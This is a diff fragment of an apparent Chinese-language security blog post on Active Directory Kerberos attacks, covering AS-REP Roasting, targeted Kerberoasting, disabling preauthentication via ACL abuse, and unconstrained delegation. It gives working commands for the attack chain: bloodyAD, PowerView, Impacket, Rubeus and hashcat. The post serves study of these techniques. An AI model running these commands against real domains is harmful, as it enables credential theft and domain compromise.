+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.10.10 -u &quot;YourUser&quot; -p &quot;YourPass&quot; add spn &quot;TargetUser&quot; &quot;CIFS/fake.service.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除SPN</strong></p>
+<h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><h3 id="kerberos-preauthentication-kerbers-预认证"><a href="#kerberos-preauthentication-kerbers-预认证" class="headerlink" title="kerberos preauthentication (kerbers 预认证)"></a>kerberos preauthentication (kerbers 预认证)</h3><p>step1：客户端像PDC发送一个<strong>AS-REQ</strong> 包含用户密码衍生的hash加密的时间戳以及用户名</p>
+<p>step2：域控收到请求，查找和用户名关联的密码hash，并尝试解密时间戳。如果解密成功并且时间戳没有重复，则认证成功，向客户端返回<strong>AS-REP</strong>，AS-REP包含用户密码hash加密的session-key和TGT。</p>
+<h3 id="AS-REP-Roasting-1"><a href="#AS-REP-Roasting-1" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>当某个账户没有启用kerberos preauthentication的时候，攻击者可以指定用户向域控制器(KDC)请求一个AS-REQ请求，KDC此时不会做任何验证就会给攻击者返回TGT和使用用户密码hash加密的session key，如果这时我们就可以对目标用户的密码hash进行离线爆破。</p>
+<h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><h4 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h4><p>powershell脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired</span><br><span class="line">Get-ADUser</span><br></pre></td></tr></table></figure>
+
+<p>Impacket工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip &lt;ip&gt; &lt;syn&gt;</span><br><span class="line">#impacket-GetNPUsers bruno.vl/svc_scan -dc-ip 10.129.238.9 -no-pass</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><p><strong>当前主机在域内</strong></p>
+<p>rebueus or poweshell脚本 asreproast.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure>
+
+<p><strong>非域内机器</strong></p>
+<p>1：对于非域内的机器，无法通过LDAP来发起用户名的查询。</p>
+<p>2：所以要想获取 “不需要kerberos预身份验证” 的域内账号，只能通过枚举用户名的方式来获得。而AS-REP Hash方面。非域内的主机，只要能和DC通信，便可以获取到。使用Get-ASREPHash，通过指定Server的参数即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a><strong>爆破hash</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Targeted-AS-REP-Roasting"><a href="#Targeted-AS-REP-Roasting" class="headerlink" title="Targeted AS-REP Roasting"></a>Targeted AS-REP Roasting</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AS-REP Roasting如果枚举发现目标账户里没有账户启用了不要求kerberos预认证，这时AS-REP Roasting用不了。但如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，我们可以使用这些权限修改目标账户的ACCount Control option 启用Do not require Keberos presauthenication，这样就可以执行AS-REP Roasting</span><br></pre></td></tr></table></figure>
+
+<p>攻击步骤</p>
+<h3 id="枚举ACL-1"><a href="#枚举ACL-1" class="headerlink" title="枚举ACL"></a>枚举ACL</h3><p>寻找拥有对其有GeneriteWrite或GeneriteAll权限的用户</p>
+<p>使用Find-InterestingDomainAcl（powershell）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.SecurityIdentifier -match &quot;rto&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者bloodhound探测域内环境也可以看到</p>
+<h3 id="启用”Do-not-require-Keberos-presauthenication”"><a href="#启用”Do-not-require-Keberos-presauthenication”" class="headerlink" title="启用”Do not require Keberos presauthenication”"></a>启用”Do not require Keberos presauthenication”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity &quot;TargetUser&quot; -XOR @&#123;useraccountcontrol=4194304&#125; -Verbose</span><br><span class="line">Set-ADAccountControl -Id user01 -DoesNotRequirePreAuth:$true</span><br></pre></td></tr></table></figure>
+
+<p>后面步骤就是AS-REP Roasting的步骤 略</p>
+<h2 id="Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting"><a href="#Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting" class="headerlink" title="Targeted kerberoasting VS Targeted AS-REP Roasting"></a>Targeted kerberoasting VS Targeted AS-REP Roasting</h2><table>
+<thead>
+<tr>
+<th><strong>维度</strong></th>
+<th><strong>Targeted Kerberoasting</strong></th>
+<th><strong>Targeted AS-REP Roasting</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>核心操作</strong></td>
+<td>为目标用户添加一个伪造的 <strong>SPN</strong> (Service Principal Name)。</td>
+<td>修改 <code>userAccountControl</code> (UAC) 属性，设置 <strong>DONT_REQUIRE_PREAUTH</strong> 标志位。</td>
+</tr>
+<tr>
+<td><strong>利用方式</strong></td>
+<td>请求 TGS 票据并离线破解 Hash。</td>
+<td>请求 AS-REP 响应并离线破解 Hash。</td>
+</tr>
+<tr>
+<td><strong>关键属性</strong></td>
+<td><code>servicePrincipalName</code></td>
+<td><code>userAccountControl</code></td>
+</tr>
+<tr>
+<td><strong>权限要求</strong></td>
+<td><code>GenericAll</code>, <code>GenericWrite</code>, 或对 <code>servicePrincipalName</code> 有 <code>WriteProperty</code>。</td>
+<td><code>GenericAll</code>, <code>GenericWrite</code>, 或对 <code>userAccountControl</code> 有 <code>WriteProperty</code>。</td>
+</tr>
+</tbody></table>
+<p><strong>默认首选：Targeted Kerberoasting</strong>。因为它在攻击链中更隐蔽，且对域环境的侵入性相对较小。</p>
+<p><strong>备选方案：Targeted AS-REP Roasting</strong>。仅当你发现无法为该用户设置 SPN（例如 SPN 冲突）或者由于某些 EDR 规则对 TGS 请求监控极严，而对 AS-REQ 监控较松时使用。</p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/25/69c39b6b90708.webp" alt="03109a2bb3ab737c5a49e631bdace0ba.png"></p>
+<h2 id="Kerberos-Delegation"><a href="#Kerberos-Delegation" class="headerlink" title="Kerberos Delegation"></a>Kerberos Delegation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派（Delegation） 是一种允许服务代表用户去访问其他资源的功能。攻击者一旦滥用这些机制，往往可以实现权限提升或横向移动</span><br></pre></td></tr></table></figure>
+
+<p>委派相关的攻击全都存在Kerberos协议认证的step 4</p>
+<h3 id="非约束委派-Unconstrained-delegation"><a href="#非约束委派-Unconstrained-delegation" class="headerlink" title="非约束委派-Unconstrained delegation"></a>非约束委派-Unconstrained delegation</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的TGT发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务</span><br></pre></td></tr></table></figure>
+
+<p>当一个计算机或账号被设置为“非约束委派”时，任何域用户访问该服务，其 <strong>TGT（Ticket Granting Ticket，认购权证）</strong> 都会被发送到该服务器的内存中。</p>
+<ul>
+<li><strong>正常流程</strong>：用户 A访问服务器 B，KDC 将 A的 TGT 副本打包在服务票据（TGS）中发给 B。</li>
+<li><strong>委派行为</strong>：服务器 B 收到票据后，将用户 A的 TGT 解析出来并存储在自己的 <code>LSASS</code> 进程中。</li>
+<li><strong>结果</strong>：服务器 B 现在拥有了用户 A 的“身份证”完整副本，可以在 TGT 有效期内，代表用户 A访问域内的<strong>任何</strong>资源。</li>
+</ul>
+<p><strong>因此如果我们的可控主机B是域内非约束委派的主机，当域控或者其他主机通过kerberos协议访问我们的机器的时候，就会在内存留下TGT票据，我们可以通过TGT票据来访问该主机可以访问的任意服务。</strong></p>
+<p>以上我们就可以直接获取域控权限</p>
 </article>
 <div class="article-footer">
     <section id="license">
@@ -140,7 +257,7 @@
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化学习</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/04/09/XYCTF2025-WEB/">XYCTF2025-WEB WP</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2026/04/28/Spoofing/">Spoofing-wp</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/04/01/order%20by%E6%B3%A8%E5%85%A5/">ORDER by 注入</a></div></section></div>
 
 
 
@@ -154,7 +271,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E7%89%8CWAF"><span class="toc-text">奶龙牌WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file-%E5%87%BD%E6%95%B0"><span class="toc-text">move_uploaded_file 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95%EF%BC%9A"><span class="toc-text">定义和用法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-text">提示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%81%9A%E6%B3%95"><span class="toc-text">题目做法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E5%99%A8"><span class="toc-text">恶意代码检测器</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Client%E5%92%8CAS-Authentication-Service-%E4%BA%A4%E4%BA%92"><span class="toc-text">Client和AS(Authentication Service)交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-TGS-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 TGS 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-Server-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 Server 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN%EF%BC%88service-principal-name%EF%BC%89%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0"><span class="toc-text">SPN（service principal name）服务主体名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB-1"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BESPN"><span class="toc-text">枚举SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E8%8E%B7%E5%8F%96hash%EF%BC%9A"><span class="toc-text">导出票据获取hash：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash%EF%BC%9A"><span class="toc-text">爆破hash：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting"><span class="toc-text">Targeted kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AESPN"><span class="toc-text">设置SPN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-preauthentication-kerbers-%E9%A2%84%E8%AE%A4%E8%AF%81"><span class="toc-text">kerberos preauthentication (kerbers 预认证)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting-1"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-text">枚举用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-text">爆破hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-AS-REP-Roasting"><span class="toc-text">Targeted AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL-1"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E2%80%9DDo-not-require-Keberos-presauthenication%E2%80%9D"><span class="toc-text">启用”Do not require Keberos presauthenication”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting"><span class="toc-text">Targeted kerberoasting VS Targeted AS-REP Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Delegation"><span class="toc-text">Kerberos Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-delegation"><span class="toc-text">非约束委派-Unconstrained delegation</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
